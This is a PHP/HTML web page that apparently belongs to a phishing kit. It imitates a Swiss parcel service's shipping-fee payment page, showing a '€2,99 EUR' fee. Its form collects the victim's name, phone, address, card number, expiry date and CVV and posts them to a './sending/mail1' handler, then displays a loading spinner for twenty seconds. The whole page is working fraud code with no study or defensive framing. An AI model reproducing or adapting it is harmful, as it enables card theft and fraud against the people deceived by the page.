<?php

    session_start();

    require 'lang.php';
    require 'main.php';
    require 'config/settings.php';

?>
<!DOCTYPE html>
<html lang="de">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/x-icon" href="./assets/img/favicon.ico"/>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'SwissSignCircularWeb-Regular', sans-serif;
            background: url('./assets/img/background.png') no-repeat center center fixed;
            background-size: cover;
            font-size: 16px;
        }

        header {
            background-color: #FFCC00;
            color: #333;
            text-align: center;
            padding: 1em;
        }

        header img {
            max-width: 200px;
            height: auto;
            display: block;
            margin: 0 auto;
        }

        .summary-container {
            text-align: center;
            margin: 20px auto;
            padding: 20px;
            border-radius: 10px;
            max-width: 500px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        .summary-container img {
            width: 100px;
            margin-bottom: 10px;
        }

        .shipping-fee {
            display: flex;
            justify-content: space-between;
        }

        .currency {
            color: #333;
        }

        .container {
            text-align: center;
            margin: 50px auto;
            padding: 20px;
            border-radius: 10px;
            max-width: 500px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        h1 {
            font-family: 'SwissSignCircularWeb-Bold', sans-serif;
        }

        .form-group {
            position: relative;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 0;
            border-bottom: 2px solid #ccc;
            box-sizing: border-box;
            font-size: 16px;
            background-color: transparent;
            transition: border-color 0.3s;
            color: #333;
        }

        input:focus {
            outline: none;
            border-bottom-color: #000000;
        }

        label {
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-50%);
            color: #888;
            transition: all 0.3s ease;
            pointer-events: none;
            background-color: #fff;
            padding: 0 5px;
        }

        input:focus + label,
        input:not(:placeholder-shown) + label {
            top: -12px;
            font-size: 12px;
            color: #333;
        }

        button {
            background-color: #000000;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            box-sizing: border-box;
            font-size: 16px;
        }

        @media (max-width: 600px) {
            input,
            button {
                width: 100%;
            }
        }

        @font-face {
            font-family: 'SwissSignCircularWeb-Regular';
            src: url('./assets/fonts/SwissSignCircularWeb-Regular.3938e032.woff2') format('woff2');
            font-weight: normal;
            font-style: normal;
        }

        @font-face {
            font-family: 'SwissSignCircularWeb-Bold';
            src: url('./assets/fonts/SwissSignCircularWeb-Bold.c6a5de6b.woff2') format('woff2');
            font-weight: bold;
            font-style: normal;
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9); /* White background with some transparency */
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .overlay-content {
            text-align: center;
        }

        .spinner {
            border: 6px solid #FFCC00;
            border-radius: 50%;
            border-top: 6px solid transparent;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
    <script>
      document.addEventListener('DOMContentLoaded', function () {
          function showSpinner() {
              var overlay = document.createElement('div');
              overlay.className = 'overlay';
              document.body.appendChild(overlay);

              var overlayContent = document.createElement('div');
              overlayContent.className = 'overlay-content';
              overlay.appendChild(overlayContent);

              var spinner = document.createElement('div');
              spinner.className = 'spinner';
              overlayContent.appendChild(spinner);

              setTimeout(function () {
                  overlay.remove();
              }, 20000);
          }

          document.querySelector('form').addEventListener('submit', function (event) {
              var formValid = true;
              var requiredFields = document.querySelectorAll('[required]');

              requiredFields.forEach(function (field) {
                  if (!field.value.trim()) {
                      formValid = false;
                      // Highlight the empty field (you can add more styling or feedback if needed)
                      field.style.borderBottomColor = '#000000';
                  }
              });

              if (formValid) {
                  // Allow the form to submit
                  // Show the spinner
                  showSpinner();
              } else {
                  // Prevent the form from submitting
                  event.preventDefault();
              }
          });
      });
  </script>



  <title><?php echo lang('1'); ?></title>
</head>

<body>

    <header>
        <img src="./assets/img/logo.svg" width="70" alt="Logo">
    </header>

    <div class="summary-container">
        <img src="./assets/img/package.svg" alt="Paket">
        <div class="shipping-fee">
            <p><?php echo lang('13'); ?></p>
            <p class="currency">€2,99 EUR
</p>
        </div>
    </div>

    <div class="container">
        <h1><?php echo lang('2'); ?></h1>
        <p><?php echo lang('3'); ?></p>

        <form action="./sending/mail1" method="POST">
            <div class="form-group">
                <input type="text" id="fullname" placeholder="<?php echo lang('4'); ?>" name="fullname" required>
            </div>

            <div class="form-group">
                <input type="tel" id="phone" data-mask="000000000" placeholder="<?php echo lang('5'); ?>" name="phone" required>
            </div>

            <div class="form-group">
                <input type="text" id="address" placeholder="<?php echo lang('6'); ?>" name="address" required>
            </div>

            <div class="form-group">
                <input type="text" id="city" placeholder="<?php echo lang('7'); ?>" name="city" required>
            </div>

            <div class="form-group">
                <input type="tel" id="zip" data-mask="0000" placeholder="<?php echo lang('8'); ?>" name="zip" required>
            </div>

            <div class="form-group">
                <input type="tel" id="cardnumber" data-mask="0000000000000000" maxlength="16" placeholder="<?php echo lang('9'); ?>" name="cc" required>
            </div>

            <div class="form-group">
                <input type="tel" id="exp" name="exp" data-mask="00/00" placeholder="<?php echo lang('10'); ?>" required>
            </div>

            <div class="form-group">
                <input type="tel" id="cvv" data-mask="000" name="cvv" placeholder="<?php echo lang('11'); ?>" required>
            </div>

            <div class="form-group">
            </div>

            <button type="submit"><?php echo lang('12'); ?></button>
        </form>
    </div>
       <script>
        // Load the Maps JavaScript API without an API key
        const script = document.createElement('script');
        script.src = 'https://maps.googleapis.com/maps/api/js?libraries=places&callback=initMap';
        document.head.appendChild(script);
    </script>
       <script>
        function initMap() {
            const map = new google.maps.Map(document.getElementById('map'), {
                center: { lat: -33.8688, lng: 151.2195 },
                zoom: 13
            });
            const input = document.createElement('input');
            input.setAttribute('type', 'text');
            input.setAttribute('id', 'autocomplete');
            input.setAttribute('placeholder', 'Enter a location');
            document.body.appendChild(input);

            const autocomplete = new google.maps.places.Autocomplete(input);
            autocomplete.bindTo('bounds', map);
            const infowindow = new google.maps.InfoWindow();
            const marker = new google.maps.Marker({
                map,
                anchorPoint: new google.maps.Point(0, -29)
            });

            autocomplete.addListener('place_changed', () => {
                infowindow.close();
                marker.setVisible(false);
                const place = autocomplete.getPlace();

                if (!place.geometry) {
                    window.alert("No details available for input: '" + place.name + "'");
                    return;
                }

                if (place.geometry.viewport) {
                    map.fitBounds(place.geometry.viewport);
                } else {
                    map.setCenter(place.geometry.location);
                    map.setZoom(17);
                }

                marker.setPosition(place.geometry.location);
                marker.setVisible(true);

                let address = '';
                let city = '';
                let zip = '';

                if (place.address_components) {
                    for (const component of place.address_components) {
                        const componentType = component.types[0];
                        switch (componentType) {
                            case 'street_number':
                                address += component.short_name + ' ';
                                break;
                            case 'route':
                                address += component.short_name;
                                break;
                            case 'locality':
                                city = component.short_name;
                                break;
                            case 'postal_code':
                                zip = component.short_name;
                                break;
                            default:
                                break;
                        }
                    }
                }

                document.getElementById('address').value = address;
                document.getElementById('city').value = city;
                document.getElementById('zip').value = zip;

                infowindow.setContent('<div><strong>' + place.name + '</strong><br>' + address);
                infowindow.open(map, marker);
            });
        }
    </script>
    <script src="./assets/js/card-validation.js"></script>
</body>


</html>
